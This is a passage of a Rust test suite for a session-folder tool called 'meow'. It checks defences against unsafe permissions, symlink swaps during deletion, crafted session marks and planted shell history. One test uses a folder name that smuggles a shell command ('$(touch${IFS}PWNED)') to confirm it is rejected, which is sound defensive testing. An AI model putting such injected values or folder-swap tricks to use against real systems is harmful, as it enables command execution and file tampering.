            fx.home.root().to_path_buf(),
            fx.home.workspaces_dir(),
            fx.home.root().join("geo"),
        ] {
            let env = SessionEnv {
                session: None,
                workspace: Some(bad.clone()),
            };
            assert!(
                resolve_helper_dir(&fx.home, &fx.cwd, false, None, &env).is_err(),
                "accepted {:?}",
                bad
            );
        }

        // Unaccepted foreign `./.meow` is not mutated before adopt(), and
        // adopt() discards its recorded `last_cwd`.
        let cloned = fx.cwd.join("cloned-repo");
        let dot_meow = cloned.join(".meow");
        fs::create_dir_all(&dot_meow).unwrap();
        fs::write(
            dot_meow.join(PROFILE_FILE),
            "name = \"repo\"\nmode = \"aggressive\"\n",
        )
        .unwrap();
        fs::write(dot_meow.join("last_cwd"), format!("{}\n", fx.cwd.display())).unwrap();
        for shell in HISTORY_SHELLS {
            fs::write(dot_meow.join(format!("{shell}_history")), "echo planted\n").unwrap();
        }
        // Only its own name opens it; another name makes a new session.
        assert_eq!(
            local_location(&fx.home, &cloned, "review").unwrap(),
            Location::Folder(cloned.clone())
        );
        let location = local_location(&fx.home, &cloned, "repo").unwrap();
        assert_eq!(location, Location::Legacy(cloned.clone()));
        let (mut ws, _) = Workspace::open_at(&fx.home, &location, "repo", Mode::Light).unwrap();
        assert!(ws.is_foreign(&fx.home));
        assert!(!dot_meow.join("tmp").exists());
        assert!(!dot_meow.join("chats").exists());

        ws.adopt(&fx.home, Mode::Light).unwrap();
        assert!(!ws.is_foreign(&fx.home));
        assert!(dot_meow.join("tmp").is_dir());
        assert!(dot_meow.join("chats").is_dir());
        assert!(!ws.last_cwd_path().exists());
        for shell in HISTORY_SHELLS {
            assert!(!ws.history_path(shell).exists(), "{shell}");
        }

        // UNC paths in last_cwd are rejected before touching the filesystem.
        fs::write(ws.last_cwd_path(), "\\\\198.51.100.99\\share\\dir\n").unwrap();
        assert_eq!(ws.restored_cwd(), None);
    }

    /// A folder of its own beside the fixture's project folder.
    fn other_folder(fx: &Fixture, name: &str) -> PathBuf {
        let dir = fx.cwd.parent().unwrap().join(name);
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn open_in(fx: &Fixture, folder: &Path, name: &str) -> Workspace {
        let location = Location::Folder(folder.to_path_buf());
        Workspace::open_at(&fx.home, &location, name, Mode::Light)
            .unwrap()
            .0
    }

    #[test]
    fn a_session_is_found_here_then_elsewhere_then_at_home_then_in_an_old_dot_meow() {
        let fx = fixture();
        let elsewhere = other_folder(&fx, "elsewhere");
        let find = |cwd: &Path, name: &str| find_session(&fx.home, cwd, name).unwrap();
        assert_eq!(find(&fx.cwd, "acme"), None);
        assert!(!fx.home.root().exists(), "looking creates nothing");

        // d: an old ./.meow here, by its name only.
        let legacy = Location::Legacy(fx.cwd.clone());
        Workspace::open_at(&fx.home, &legacy, "acme", Mode::Light).unwrap();
        assert_eq!(find(&fx.cwd, "acme"), Some(legacy.clone()));
        assert_eq!(find(&fx.cwd, "beta"), None);
        assert_eq!(
            find(&elsewhere, "acme"),
            None,
            "an old ./.meow is not recorded"
        );
        // c: ~/.meow/workspaces wins over it.
        open(&fx, "acme", false);
        assert_eq!(find(&fx.cwd, "acme"), Some(Location::Home));
        assert_eq!(find(&elsewhere, "acme"), Some(Location::Home));
        // b: one saved in another folder wins over that, from anywhere.
        let saved = other_folder(&fx, "saved");
        open_in(&fx, &saved, "acme");
        assert_eq!(find(&fx.cwd, "acme"), Some(Location::Folder(saved.clone())));
        assert_eq!(
            find(&elsewhere, "acme"),
            Some(Location::Folder(saved.clone()))
        );
        // a: ./meow/acme here wins over everything.
        let here = open_in(&fx, &fx.cwd, "acme");
        assert_eq!(here.dir, fx.cwd.join("meow").join("acme"));
        assert_eq!(
            find(&fx.cwd, "acme"),
            Some(Location::Folder(fx.cwd.clone()))
        );
        // The newest record wins elsewhere.
        assert_eq!(
            find(&elsewhere, "acme"),
            Some(Location::Folder(fx.cwd.clone()))
        );
        // Opening by flag goes where it says.
        assert_eq!(
            local_location(&fx.home, &fx.cwd, "acme").unwrap(),
            Location::Folder(fx.cwd.clone())
        );
        assert!(!elsewhere.join("meow").exists());
    }

    #[test]
    fn a_record_counts_only_while_its_folder_holds_its_mark() {
        let fx = fixture();
        let saved = other_folder(&fx, "saved");
        let ws = open_in(&fx, &saved, "acme");
        let elsewhere = other_folder(&fx, "elsewhere");
        let found = |name: &str| find_session(&fx.home, &elsewhere, name).unwrap();
        assert_eq!(found("acme"), Some(Location::Folder(saved.clone())));

        // Another session put in its place (a copy, a clone): not this one.
        fs::write(
            ws.profile_path(),
            "name = \"acme\"\nid = \"0123456789abcdef0123456789abcdef\"\n",
        )
        .unwrap();
        assert_eq!(found("acme"), None);
        assert!(list_workspaces(&fx.home, &elsewhere).unwrap().is_empty());
        // Gone altogether: not found, and not created again by looking.
        fs::remove_dir_all(&ws.dir).unwrap();
        assert_eq!(found("acme"), None);
        assert!(!ws.dir.exists());
        // The next record written drops both, as its folder shows them gone;
        // one whose folder is out of reach (a drive not mounted) stays.
        let mark = "00112233445566778899aabbccddeeff";
        let away = fx.cwd.join("unmounted").join("meow").join("away");
        fs::write(
            fx.home.local_record_path(),
            format!(
                "{}\t{}\n{mark}\t{}\n",
                ws.profile.id.clone().unwrap(),
                ws.dir.display(),
                away.display()
            ),
        )
        .unwrap();
        open_in(&fx, &saved, "beta");
        let record = read_record(&fx.home);
        let dirs: Vec<_> = record.iter().map(|e| e.dir.clone().unwrap()).collect();
        assert_eq!(dirs, [away, saved.join("meow").join("beta")]);
    }

    #[test]
    fn the_record_reads_old_and_new_lines_and_stays_private() {
        let mark_a = "0123456789abcdef0123456789abcdef";
        let mark_b = "fedcba9876543210fedcba9876543210";
        let abs = if cfg!(windows) {
            "C:\\j\\proj\\meow\\acme"
        } else {
            "/home/j/proj/meow/acme"
        };
        let text = format!(
            "{mark_a}\n\
             {mark_b}\t{abs}\r\n\
             not-a-mark\t/x/meow/y\n\
             {mark_a}\trelative/meow/z\n\
             {mark_b}\t/x/meow/\u{7}bell\n\
             \n"
        );
        let entries = parse_record(&text);
        let entry = |mark: &str, dir: Option<&str>| Entry {
            mark: mark.into(),
            dir: dir.map(PathBuf::from),
        };
        assert_eq!(
            entries,
            [
                entry(mark_a, None),
                entry(mark_b, Some(abs)),
                // A broken folder keeps its mark, which still counts.
                entry(mark_a, None),
                entry(mark_b, None),
            ]
        );

        let fx = fixture();
        let dir = fx.cwd.join("meow").join("acme");
        remember(&fx.home, mark_a, None).unwrap();
        remember(&fx.home, mark_b, Some(&dir)).unwrap();
        // The same again changes nothing; a new place replaces the old one.
        remember(&fx.home, mark_b, Some(&dir)).unwrap();
        let moved = fx.cwd.join("moved").join("meow").join("acme");
        remember(&fx.home, mark_b, Some(&moved)).unwrap();
        assert_eq!(
            fs::read_to_string(fx.home.local_record_path()).unwrap(),
            format!("{mark_a}\n{mark_b}\t{}\n", moved.display())
        );
        assert_eq!(marks(&fx.home), [mark_a, mark_b]);
        #[cfg(unix)]
        assert_eq!(mode_of(&fx.home.local_record_path()), 0o600);
        // Forgetting a folder leaves the other lines.
        forget(&fx.home, &moved, Some(mark_b)).unwrap();
        assert_eq!(marks(&fx.home), [mark_a]);
        // At most so many lines are kept, the newest.
        let many: Vec<Entry> = (0..MAX_LOCAL_MARKS + 5)
            .map(|i| entry(&format!("{i:032x}"), None))
            .collect();
        write_record(&fx.home, &many).unwrap();
        let kept = read_record(&fx.home);
        assert_eq!(kept.len(), MAX_LOCAL_MARKS);
        assert_eq!(kept[0].mark, format!("{:032x}", 5));
    }

    #[test]
    fn new_sessions_go_only_where_the_folder_is_the_users_and_meow_is_free() {
        let fx = fixture();
        let check = |folder: &Path| check_new_folder(&fx.home, folder, "acme");
        let refused = |folder: &Path, why: &str| {
            let reason = check(folder).unwrap_err();
            assert!(reason.contains(why), "{}: {reason}", folder.display());
        };
        assert_eq!(check(&fx.cwd), Ok(()));
        // A folder that does not exist yet can still be made.
        assert_eq!(check(&fx.cwd.join("new").join("deeper")), Ok(()));
        refused(Path::new(if cfg!(windows) { "C:\\" } else { "/" }), "root");
        fs::create_dir_all(fx.home.workspaces_dir()).unwrap();
        refused(fx.home.root(), "own data folder");
        refused(&fx.home.workspaces_dir().join("x"), "own data folder");
        refused(&fx.cwd.join("bad\nname"), "control characters");
        refused(&fx.cwd.join("tab\there"), "control characters");
        fs::write(fx.cwd.join("file"), "x").unwrap();
        refused(&fx.cwd.join("file"), "is a file");

        // ./meow must be meow's: missing, empty, or with meow's .gitignore.
        let meow = fx.cwd.join("meow");
        fs::write(&meow, "the meow program").unwrap();
        refused(&fx.cwd, "is a file");
        fs::remove_file(&meow).unwrap();
        fs::create_dir(&meow).unwrap();
        assert_eq!(check(&fx.cwd), Ok(()), "an empty one is taken");
        fs::write(meow.join("Cargo.toml"), "[package]\n").unwrap();
        refused(&fx.cwd, "other files");
        fs::write(meow.join(".gitignore"), "target/\n").unwrap();
        refused(&fx.cwd, "other files");
        // Only meow's word for word: this one lets git take everything in.
        let header = SESSIONS_MARKER_TEXT.lines().next().unwrap();
        fs::write(meow.join(".gitignore"), format!("{header}\n!*\n")).unwrap();
        refused(&fx.cwd, "other files");
        fs::write(meow.join(".gitignore"), format!("{header}\n")).unwrap();
        refused(&fx.cwd, "other files");
        fs::write(meow.join(".gitignore"), SESSIONS_MARKER_TEXT).unwrap();
        assert_eq!(check(&fx.cwd), Ok(()));
        fs::create_dir(meow.join("acme")).unwrap();
        refused(&fx.cwd, "already exists");
        assert_eq!(check_new_folder(&fx.home, &fx.cwd, "beta"), Ok(()));
        #[cfg(unix)]
        {
            fs::remove_dir_all(&meow).unwrap();
            let target = other_folder(&fx, "target");
            std::os::unix::fs::symlink(&target, &meow).unwrap();
            refused(&fx.cwd, "is a link");
            fs::remove_file(&meow).unwrap();

            // Folders other users can write to, like /tmp.
            let shared = other_folder(&fx, "shared");
            for mode in [0o777, 0o1777, 0o757] {
                chmod(&shared, mode);
                refused(&shared, "other users can write");
            }
            // Group write: fine for a group that is the user's alone (a
            // user private group), not for one others are in (macOS's
            // staff, a shared `users`), whatever the user's own group is.
            chmod(&shared, 0o775);
            crate::perms::with_private_group(true, || assert_eq!(check(&shared), Ok(())));
            crate::perms::with_private_group(false, || refused(&shared, "other users can write"));
            chmod(&shared, 0o755);
            assert_eq!(check(&shared), Ok(()));
            chmod(&shared, 0o1777);
            assert!(Workspace::open_or_create(&fx.home, &shared, "x", true, Mode::Light).is_err());
            assert!(!shared.join("meow").exists());
        }
    }

    #[cfg(unix)]
    #[test]
    fn answers_name_folders_from_home_or_from_here() {
        let cwd = Path::new("/work/proj");
        let home = Some(Path::new("/home/j"));
        let folder = |answer: &str| folder_from_answer(cwd, answer, home);
        assert_eq!(folder("  /srv/x  "), Ok(PathBuf::from("/srv/x")));
        assert_eq!(folder("~"), Ok(PathBuf::from("/home/j")));
        assert_eq!(folder("~/Desktop"), Ok(PathBuf::from("/home/j/Desktop")));
        assert_eq!(folder("client"), Ok(PathBuf::from("/work/proj/client")));
        assert_eq!(folder("./a/../b/."), Ok(PathBuf::from("/work/proj/b")));
        assert_eq!(folder("../../../.."), Ok(PathBuf::from("/")));
        assert_eq!(folder("~user"), Ok(PathBuf::from("/work/proj/~user")));
        assert!(folder("   ").is_err());
        assert!(folder_from_answer(cwd, "~/x", None).is_err());
    }

    #[test]
    fn cloud_synced_folders_are_recognised_by_name() {
        for synced in [
            "/Users/j/Dropbox/work",
            "C:\\Users\\j\\OneDrive\\Desktop",
            "/Users/j/Library/Mobile Documents/com~apple~CloudDocs/x",
            "/Users/j/Library/CloudStorage/GoogleDrive-j@example.com/My Drive",
            "G:\\Google Drive\\x",
            "/Users/j/iCloud Drive/x",
        ] {
            assert!(looks_cloud_synced(Path::new(synced)), "{synced}");
        }
        for local in ["/Users/j/Desktop", "/home/j/proj", "C:\\work"] {
            assert!(!looks_cloud_synced(Path::new(local)), "{local}");
        }
    }

    #[test]
    fn the_listing_shows_each_session_once_wherever_it_lives() {
        let fx = fixture();
        let saved = other_folder(&fx, "saved");
        open(&fx, "here", true);
        open_in(&fx, &saved, "away");
        open(&fx, "home", false);
        let legacy = Location::Legacy(fx.cwd.clone());
        Workspace::open_at(&fx.home, &legacy, "old", Mode::Light).unwrap();
        let places = |cwd: &Path| -> Vec<(String, PathBuf)> {
            let mut listed: Vec<_> = list_workspaces(&fx.home, cwd)
                .unwrap()
                .into_iter()
                .map(|w| (w.name, w.dir))
                .collect();
            listed.sort();
            listed
        };
        let mut expected = vec![
            ("away".to_owned(), saved.join("meow").join("away")),
            ("here".to_owned(), fx.cwd.join("meow").join("here")),
            ("home".to_owned(), fx.home.workspace_dir("home")),
            ("old".to_owned(), fx.cwd.join(".meow")),
        ];
        // Here, `./meow/here` is both in the folder and in the record.
        assert_eq!(places(&fx.cwd), expected);
        // From another folder the old ./.meow is not seen.
        expected.retain(|(name, _)| name != "old");
        assert_eq!(places(&saved), expected);
    }

    #[test]
    fn deleting_a_session_forgets_it_and_tidies_its_folder() {
        let fx = fixture();
        let (acme, _) = open(&fx, "acme", true);
        let (beta, _) = open(&fx, "beta", true);
        let meow = fx.cwd.join("meow");
        let elsewhere = other_folder(&fx, "elsewhere");

        // Found by name from another folder, deleted with its record.
        let target = find_for_deletion(&fx.home, &elsewhere, Some("acme")).unwrap();
        assert_eq!(target.dir, acme.dir);
        delete(&fx.home, &target).unwrap();
        assert!(!acme.dir.exists() && beta.dir.exists());
        assert_eq!(read_record(&fx.home).len(), 1);
        assert!(meow.join(".gitignore").is_file(), "beta is still there");
        assert!(find_for_deletion(&fx.home, &elsewhere, Some("acme")).is_err());

        // The last one goes with ./meow, which held only the .gitignore.
        let target = find_for_deletion(&fx.home, &fx.cwd, None).unwrap();
        assert_eq!(target.dir, beta.dir);
        delete(&fx.home, &target).unwrap();
        assert!(!meow.exists());
        assert!(fx.cwd.is_dir());
        assert!(read_record(&fx.home).is_empty());

        // Anything else of the user's in ./meow keeps it.
        let (gamma, _) = open(&fx, "gamma", true);
        fs::write(meow.join("notes.txt"), "mine").unwrap();
        let target = find_for_deletion(&fx.home, &fx.cwd, Some("gamma")).unwrap();
        delete(&fx.home, &target).unwrap();
        assert!(!gamma.dir.exists());
        assert_eq!(fs::read_to_string(meow.join("notes.txt")).unwrap(), "mine");
    }

    #[test]
    fn a_path_with_a_word_between_two_ats_never_holds_a_session() {
        // The shell start-up files are filled in word by word: a folder
        // named like one of those words could add its own commands.
        for path in [
            "/x/@HOOKS@$(touch${IFS}PWNED)",
            "/x/a@REPLAY@b",
            "/x/@my_word@/y",
        ] {
            assert!(has_placeholder(Path::new(path)), "{path}");
        }
        for path in [
            "/Users/j/Library/CloudStorage/GoogleDrive-j@example.com/My Drive",
            "/x/@/y",
            "/x/@@/y",
            "/x/a@b c@d",
            "/x/user@host/x@y",
        ] {
            assert!(!has_placeholder(Path::new(path)), "{path}");
        }
        let fx = fixture();
        let trap = other_folder(&fx, "@HOOKS@$(touch${IFS}PWNED)");
        let reason = check_new_folder(&fx.home, &trap, "eta").unwrap_err();
        assert!(reason.contains("@NAME@"), "{reason}");
        assert!(local_location(&fx.home, &trap, "eta").is_err());
        // One already there is not opened either.
        fs::create_dir_all(trap.join("meow").join("eta")).unwrap();
        fs::write(trap.join("meow/eta/profile.toml"), "name = \"eta\"\n").unwrap();
        let location = Location::Folder(trap.clone());
        let err = Workspace::open_at(&fx.home, &location, "eta", Mode::Light).unwrap_err();
        assert!(err.to_string().contains("@NAME@"), "{err:#}");
        assert!(!trap.join("meow/eta/tmp").exists());
    }

    /// macOS: an access list entry on a folder whose mode bits let no one
    /// else write, read when the folder is named through a link too. Read
    /// from the link itself (`acl_get_link_np`), the entry is not seen.
    #[cfg(target_os = "macos")]
    #[test]
    fn macos_reads_the_access_list_of_a_folder_named_through_a_link() {
        use crate::perms::{why_others_can_change, Why};
        let fx = fixture();
        let real = other_folder(&fx, "acl-real");
        chmod(&real, 0o755);
        let named = fx.cwd.join("acl-named");
        std::os::unix::fs::symlink(&real, &named).unwrap();
        let made = open_in(&fx, &named, "acme");
        let status = std::process::Command::new("/bin/chmod")
            .args(["+a", "user:nobody allow add_file,delete_child"])
            .arg(&real)
            .status()
            .unwrap();
        assert!(status.success(), "chmod +a");
        let meta = fs::metadata(&named).unwrap();
        assert_eq!(why_others_can_change(&named, &meta), Some(Why::Others));
        let meta = fs::metadata(&real).unwrap();
        assert_eq!(why_others_can_change(&real, &meta), Some(Why::Others));
        let check = |folder: &Path| check_new_folder(&fx.home, folder, "beta");
        let others = Err("other users can write to it".to_owned());
        assert_eq!(check(&real), others);
        assert_eq!(check(&named), others);
        // The session made there before is not used any more.
        let location = Location::Folder(named.clone());
        let said = format!(
            "{:#}",
            Workspace::open_at(&fx.home, &location, "acme", Mode::Light).unwrap_err()
        );
        assert!(said.contains("other users can write to it"), "{said}");
        assert!(made.dir.join(PROFILE_FILE).is_file());
    }

    #[cfg(unix)]
    #[test]
    fn a_new_folder_must_be_the_users_all_the_way_up() {
        let fx = fixture();
        let check = |folder: &Path| check_new_folder(&fx.home, folder, "acme");
        // A private folder in one anybody can write to, without the sticky
        // bit: the folder can be renamed away and another put in its place.
        let open_to_all = other_folder(&fx, "open-to-all");
        let inside = open_to_all.join("proj");
        fs::create_dir(&inside).unwrap();
        chmod(&inside, 0o700);
        chmod(&open_to_all, 0o777);
        let above = "other users can write to a folder above it";
        assert_eq!(check(&inside), Err(above.into()));
        assert_eq!(check(&inside.join("new")), Err(above.into()));
        assert!(local_location(&fx.home, &inside, "acme").is_err());
        assert!(!inside.join("meow").exists());
        // Reached through a link from a folder of the user's own.
        let link = fx.cwd.join("link");
        std::os::unix::fs::symlink(&inside, &link).unwrap();
        assert_eq!(check(&link), Err(above.into()));
        // With the sticky bit, as /tmp has, only the owner can do that.
        chmod(&open_to_all, 0o1777);
        assert_eq!(check(&inside), Ok(()));
        assert_eq!(check(&link), Ok(()));
        // A folder above that a group shared with others can write to.
        chmod(&open_to_all, 0o775);
        let shared = "a group shared with other users can write to a folder above it";
        crate::perms::with_private_group(false, || {
            assert_eq!(check(&inside), Err(shared.into()));
            assert_eq!(check(&link), Err(shared.into()));
        });
        crate::perms::with_private_group(true, || assert_eq!(check(&inside), Ok(())));
        chmod(&open_to_all, 0o755);
        // A folder named through a link is checked as what it leads to.
        let real = other_folder(&fx, "real");
        chmod(&real, 0o775);
        let named = fx.cwd.join("named");
        std::os::unix::fs::symlink(&real, &named).unwrap();
        crate::perms::with_private_group(false, || {
            let shared = "a group shared with other users can write to it";
            assert_eq!(check(&named), Err(shared.into()));
        });
        crate::perms::with_private_group(true, || assert_eq!(check(&named), Ok(())));

        // Another account's folder, or one below another account's: that
        // account could swap the session's files (root's too, with sudo).
        if effective_ids().0 == 0 {
            let chown = |path: &Path, uid: u32| {
                let path = std::ffi::CString::new(path.as_os_str().as_encoded_bytes()).unwrap();
                // SAFETY: a valid C string; the test runs as root.
                assert_eq!(unsafe { libc::chown(path.as_ptr(), uid, uid) }, 0);
            };
            let theirs = other_folder(&fx, "theirs");
            chown(&theirs, 1234);
            assert_eq!(check(&theirs), Err("it belongs to another user".into()));
            let mine = theirs.join("mine");
            fs::create_dir(&mine).unwrap();
            assert_eq!(
                check(&mine),
                Err("a folder above it belongs to another user".into())
            );
            assert_eq!(
                check(&mine.join("new")),
                Err("a folder above it belongs to another user".into())
            );
        }
    }

    /// What a refusal tells the user to do fits why it was refused: a
    /// share that keeps its access list on the server is no place for a
    /// session, while where a list may be kept unread, removing group
    /// write is enough.
    #[cfg(unix)]
    #[test]
    fn a_refused_folder_is_told_what_fixes_it() {
        use crate::perms::Why;
        let fix = |why| Unsafe::of(why, "it", Path::new("/srv/proj")).fix;
        let yours = "Make that folder yours alone";
        assert_eq!(fix(Why::Others), yours);
        assert_eq!(fix(Why::Group), yours);
        assert_eq!(
            fix(Why::GroupUnknown("an NFS share")),
            "Remove group write from /srv/proj"
        );
        assert_eq!(
            fix(Why::Hidden("an SMB share")),
            "Move that folder to a disk of this computer"
        );
        assert_eq!(fix(Why::Unreadable), "Check the access list of /srv/proj");
        assert_eq!(
            Unsafe::of(
                Why::GroupUnknown("a FUSE file system"),
                "a folder above it",
                Path::new("/srv")
            ),
            Unsafe {
                reason: "a group can write to a folder above it, and meow cannot read \
                         its access list (a FUSE file system)"
                    .into(),
                fix: "Remove group write from /srv".into(),
            }
        );
    }

    /// A folder's permissions can change after a session was made in it:
    /// the session is opened, used by helpers and deleted only while no
    /// other account could swap its files.
    #[cfg(unix)]
    #[test]
    fn an_existing_session_is_used_only_while_its_folder_is_still_safe() {
        let fx = fixture();
        let proj = other_folder(&fx, "proj");
        let made = open_in(&fx, &proj, "acme");
        let location = Location::Folder(proj.clone());
        let elsewhere = other_folder(&fx, "elsewhere");
        let refused = |error: anyhow::Error, why: &str| {
            let said = format!("{error:#}");
            assert!(said.contains(why), "{said}");
            assert!(said.contains(&proj.display().to_string()), "{said}");
        };
        let all_refused = |why: &str| {
            let open = Workspace::open_at(&fx.home, &location, "acme", Mode::Light);
            refused(open.unwrap_err(), why);
            let loaded = Workspace::load(&made.dir).unwrap();
            refused(loaded.ensure_own(&fx.home, &elsewhere).unwrap_err(), why);
            let target = find_for_deletion(&fx.home, &elsewhere, Some("acme")).unwrap();
            refused(delete(&fx.home, &target).unwrap_err(), why);
            assert!(made.dir.join(PROFILE_FILE).is_file());
        };
        // Writable by a group others are in (macOS's staff, `users`).
        chmod(&proj, 0o775);
        crate::perms::with_private_group(false, || all_refused("other users can write to it"));
        crate::perms::with_private_group(true, || {
            Workspace::open_at(&fx.home, &location, "acme", Mode::Light).unwrap();
            Workspace::load(&made.dir)
                .unwrap()
                .ensure_own(&fx.home, &elsewhere)
                .unwrap();
        });
        chmod(&proj, 0o707);
        all_refused("other users can write to it. Make that folder yours alone, or delete");
        // Below a folder others can change.
        chmod(&proj, 0o755);
        let above = proj.parent().unwrap().to_path_buf();
        let mode = mode_of(&above);
        chmod(&above, 0o777);
        all_refused("other users can write to a folder above it. Make that folder yours alone");
        chmod(&above, mode);
        // Writable through an access list for another account.
        #[cfg(any(target_os = "linux", target_os = "android"))]
        if crate::perms::grant_write_acl(&proj, effective_ids().0.wrapping_add(4242)) {
            crate::perms::with_private_group(true, || all_refused("other users can write to it"));
            assert_eq!(
                check_new_folder(&fx.home, &proj, "beta"),
                Err("other users can write to it".into())
            );
            let inside = proj.join("inside");
            fs::create_dir(&inside).unwrap();
            assert_eq!(
                check_new_folder(&fx.home, &inside, "beta"),
                Err("other users can write to a folder above it".into())
            );
            // `chmod 755` takes write away from the access list's mask.
            chmod(&proj, 0o755);
        }
        // Safe again, all of it works; an old ./.meow is checked the same.
        Workspace::open_at(&fx.home, &location, "acme", Mode::Light).unwrap();
        let target = find_for_deletion(&fx.home, &elsewhere, Some("acme")).unwrap();
        delete(&fx.home, &target).unwrap();
        assert!(!made.dir.exists());
        let legacy = Location::Legacy(proj.clone());
        Workspace::open_at(&fx.home, &legacy, "old", Mode::Light).unwrap();
        chmod(&proj, 0o777);
        let error = Workspace::open_at(&fx.home, &legacy, "old", Mode::Light).unwrap_err();
        refused(error, "other users can write to it");
        chmod(&proj, 0o755);
    }

    /// `meow delete` removes the folder it checked, even if `./meow` is
    /// swapped on the way (by an account that could write to the folder):
    /// for a link to elsewhere, or for another folder with a session
    /// folder of the same name.
    #[cfg(unix)]
    #[test]
    fn deleting_never_reaches_a_folder_swapped_in_on_the_way() {
        let fx = fixture();
        let (acme, _) = open(&fx, "acme", true);
        fs::create_dir_all(acme.dir.join("chats").join("deep")).unwrap();
        fs::write(acme.dir.join("chats").join("deep").join("a.md"), "x").unwrap();
        let outside = other_folder(&fx, "outside");
        fs::write(outside.join("keep"), "x").unwrap();
        std::os::unix::fs::symlink(&outside, acme.dir.join("tmp").join("link")).unwrap();
        let listed = find_for_deletion(&fx.home, &fx.cwd, Some("acme")).unwrap();
        let meow = fx.cwd.join("meow");
        let moved = fx.cwd.join("meow.moved");
        let decoy = other_folder(&fx, "decoy");
        fs::create_dir(decoy.join("acme")).unwrap();
        fs::write(decoy.join("acme").join("keep"), "x").unwrap();
        fs::copy(acme.profile_path(), decoy.join("acme").join(PROFILE_FILE)).unwrap();
        let swap_in = |what: &Path| {
            fs::rename(&meow, &moved).unwrap();
            std::os::unix::fs::symlink(what, &meow).unwrap();
        };
        let swap_back = || {
            fs::remove_file(&meow).unwrap();
            fs::rename(&moved, &meow).unwrap();
        };

        // Swapped for a link before `meow delete` looks at anything.
        swap_in(&decoy);
        assert!(delete(&fx.home, &listed).is_err());
        assert!(decoy.join("acme").join("keep").is_file());
        swap_back();
        // For another folder of the user's (renamed in place).
        fs::rename(&meow, &moved).unwrap();
        fs::rename(&decoy, &meow).unwrap();
        let error = format!("{:#}", delete(&fx.home, &listed).unwrap_err());
        assert!(error.contains("changed since it was listed"), "{error}");
        assert!(meow.join("acme").join("keep").is_file());
        fs::rename(&meow, &decoy).unwrap();
        fs::rename(&moved, &meow).unwrap();
        // After the folder was opened: nothing is removed through the link.
        let held = HeldDir::open(&acme.dir).unwrap();
        swap_in(&decoy);
        let error = held.remove(&acme.dir).unwrap_err();
        assert!(error.to_string().contains("replaced"), "{error}");
        assert!(decoy.join("acme").join("keep").is_file());
        swap_back();

        delete(&fx.home, &listed).unwrap();
        assert!(!acme.dir.exists());
        // A link inside is removed, never followed.
        assert!(outside.join("keep").is_file());
        assert!(decoy.join("acme").join("keep").is_file());
    }

    #[test]
    fn nothing_new_goes_inside_a_session_folder() {
        let fx = fixture();
        let (acme, _) = open(&fx, "acme", true);
        let check = |folder: &Path| check_new_folder(&fx.home, folder, "lam");
        let inside = "that is inside a meow session folder";
        for folder in [
            fx.cwd.join("meow"),
            acme.dir.clone(),
            acme.dir.join("tmp"),
            acme.dir.join("new").join("deeper"),
        ] {
            assert_eq!(check(&folder), Err(inside.into()), "{}", folder.display());
        }
        assert!(local_location(&fx.home, &acme.dir, "lam").is_err());
        assert!(!acme.dir.join("meow").exists());
        // An old ./.meow, and a ./meow whose .gitignore is gone.
        let legacy = Location::Legacy(fx.cwd.clone());
        Workspace::open_at(&fx.home, &legacy, "old", Mode::Light).unwrap();
        assert_eq!(check(&fx.cwd.join(".meow").join("x")), Err(inside.into()));
        fs::remove_file(fx.cwd.join("meow").join(".gitignore")).unwrap();
        assert_eq!(check(&fx.cwd.join("meow")), Err(inside.into()));
        // A project of its own that happens to be called meow is fine.
        let project = other_folder(&fx, "src").join("meow");
        fs::create_dir_all(project.join("src")).unwrap();
        fs::write(project.join(".gitignore"), "target/\n").unwrap();
        assert_eq!(check(&project), Ok(()));
        fs::write(fx.cwd.join("meow").join(".gitignore"), SESSIONS_MARKER_TEXT).unwrap();
        assert_eq!(check(&fx.cwd), Ok(()));
    }

    #[cfg(unix)]
    #[test]
    fn a_linked_meow_never_reaches_the_users_own_session() {
        let fx = fixture();
        let (acme, _) = open(&fx, "acme", false);
        // A cloned folder whose ./meow leads, by a relative link, to where
        // the user's own sessions are.
        let repo = other_folder(&fx, "repo");
        std::os::unix::fs::symlink("../home/.meow/workspaces", repo.join("meow")).unwrap();
        assert!(repo.join("meow").join("acme").join(PROFILE_FILE).is_file());
        assert_eq!(
            find_session(&fx.home, &repo, "acme").unwrap(),
            Some(Location::Home)
        );
        let found = find_for_deletion(&fx.home, &repo, Some("acme")).unwrap();
        assert_eq!(found.dir, acme.dir);
        assert!(find_for_deletion(&fx.home, &repo, None).is_err());
        // Deleting by the linked path is refused, and nothing goes.
        let through = WorkspaceSummary {
            dir: repo.join("meow").join("acme"),
            ..found
        };
        assert!(delete(&fx.home, &through).is_err());
        assert!(acme.dir.join(PROFILE_FILE).is_file());
        let listed = list_workspaces(&fx.home, &repo).unwrap();
        assert_eq!(listed.len(), 1);
        assert_eq!(listed[0].dir, acme.dir);
    }

    #[test]
    fn a_session_is_the_users_only_where_it_was_made_or_accepted() {
        let fx = fixture();
        let saved = other_folder(&fx, "saved");
        let original = open_in(&fx, &saved, "beta");
        let mark = original.profile.id.clone().unwrap();
        fs::write(original.graph_path(), "{\"hosts\": {\"a\": {}}}").unwrap();
        let record_before = fs::read_to_string(fx.home.local_record_path()).unwrap();

        // A copy (a backup, a duplicated folder) carries the same mark.
        let copy = other_folder(&fx, "copy");
        let copied = copy.join("meow").join("beta");
        fs::create_dir_all(&copied).unwrap();
        fs::write(copy.join("meow").join(".gitignore"), SESSIONS_MARKER_TEXT).unwrap();
        fs::copy(original.profile_path(), copied.join(PROFILE_FILE)).unwrap();
        fs::copy(original.graph_path(), copied.join("graph.json")).unwrap();
        // So does a folder made with a mark someone obtained, in their mode.
        let crafted_folder = other_folder(&fx, "crafted");
        let crafted = crafted_folder.join("meow").join("zzz");
        fs::create_dir_all(&crafted).unwrap();
        fs::write(
            crafted.join(PROFILE_FILE),
            format!("name = \"zzz\"\nmode = \"aggressive\"\nid = \"{mark}\"\n"),
        )
        .unwrap();
        for (folder, name) in [(&copy, "beta"), (&crafted_folder, "zzz")] {
            let location = Location::Folder(folder.clone());
            let (ws, created) = Workspace::open_at(&fx.home, &location, name, Mode::Light).unwrap();
            assert!(!created && ws.is_foreign(&fx.home), "{name}");
            let listed = list_workspaces(&fx.home, folder).unwrap();
            let entry = listed.iter().find(|w| w.dir == ws.dir).unwrap();
            assert_eq!((entry.state, entry.hosts), (SessionState::NotYours, 0));
        }
        // Opening them moved nothing: the original is found from anywhere.
        assert_eq!(
            fs::read_to_string(fx.home.local_record_path()).unwrap(),
            record_before
        );
        assert!(!original.is_foreign(&fx.home));
        let elsewhere = other_folder(&fx, "elsewhere");
        assert_eq!(
            find_session(&fx.home, &elsewhere, "beta").unwrap(),
            Some(Location::Folder(saved.clone()))
